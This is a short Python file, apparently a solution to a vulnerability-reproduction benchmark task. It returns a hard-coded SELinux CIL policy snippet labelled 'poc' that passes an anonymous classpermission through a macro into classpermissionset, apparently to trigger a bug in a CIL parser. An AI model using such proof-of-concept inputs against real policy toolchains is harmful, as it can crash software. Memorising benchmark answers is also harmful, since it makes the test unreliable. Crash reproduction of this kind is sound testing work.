import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """(block poc
  (class myclass (perm1))

  (macro cp_macro ((cp classpermission))
    (classpermissionset cps (cp))
  )

  (call cp_macro
    ((cp (classpermission (myclass (perm1)))))
  )
)
"""
        return poc.encode("ascii")